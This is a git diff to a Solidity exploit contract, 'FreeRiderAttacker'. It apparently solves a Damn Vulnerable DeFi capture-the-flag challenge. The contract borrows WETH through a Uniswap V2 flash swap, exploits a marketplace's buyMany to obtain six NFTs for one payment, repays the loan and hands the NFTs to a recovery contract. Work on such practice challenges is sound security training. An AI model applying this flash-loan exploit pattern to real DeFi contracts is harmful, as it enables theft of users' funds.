@@ -39,30 +39,22 @@ contract FreeRiderAttacker is IERC721Receiver, IUniswapV2Callee {
     }
 
     function attack() external {
-        // Use UniswapV2Piar.swap to get 15ETH
-        token0 = _pair.token0();
-        // We need only 15ETH
-        if (token0 == address(_weth)) {
-            _pair.swap(_NFT_PRICE, uint(10), address(this), new bytes(0));
-        } else {
-            _pair.swap(uint(10), _NFT_PRICE, address(this), new bytes(0));
-        }
+        // swap을 위해서는 아래의 data가 반드시 필요하다.
+        bytes memory data = abi.encode(address(_weth), msg.sender);
+
+        _pair.swap(_NFT_PRICE, uint(0), address(this), data);
     }
 
     // callback function of _pair.swap(need to implement IUniswapV2Callee interface)
     function uniswapV2Call(
         address,
         uint256 amount0,
-        uint256 amount1,
+        uint256,
         bytes calldata
     ) external override {
         if (msg.sender != address(_pair)) return;
 
-        if (amount0 == _NFT_PRICE) {
-            _weth.withdraw(amount0);
-        } else {
-            _weth.withdraw(amount1);
-        }
+        _weth.withdraw(amount0);
 
         uint256[] memory tokenIds = new uint256[](6);
 
@@ -77,23 +69,25 @@ contract FreeRiderAttacker is IERC721Receiver, IUniswapV2Callee {
         _marketplace.buyMany{value: _NFT_PRICE}(tokenIds);
 
         // repay
-        uint256 rePayCost = ((_NFT_PRICE * 1003) / 1000) + 1;
+        uint256 rePayCost = ((amount0 * 103) / 100);
         _weth.deposit{value: rePayCost}();
         _weth.transfer(address(_pair), rePayCost);
 
         // transfer NFTs to _recovery
         for (uint256 i = 0; i < 6; i++) {
             _nft.approve(address(_recovery), i);
-            bytes memory callData = abi.encodeWithSignature(
-                "safeTransferFrom(address,address,uint256,bytes)",
-                address(this),
-                address(_recovery),
-                i,
-                abi.encode(address(this))
-            );
+            // bytes memory callData = abi.encodeWithSignature(
+            //     "safeTransferFrom(address,address,uint256,bytes)",
+            //     address(this),
+            //     address(_recovery),
+            //     i,
+            //     abi.encode(address(this))
+            // );
 
-            (bool success, ) = address(_nft).call(callData);
-            require(success, "Transfer failed");
+            // (bool success, ) = address(_nft).call(callData);
+            // require(success, "Transfer failed");
+            bytes memory data = abi.encode(address(_owner));
+            _nft.safeTransferFrom(address(this), address(_recovery), i, data);
         }
 
         withdraw();
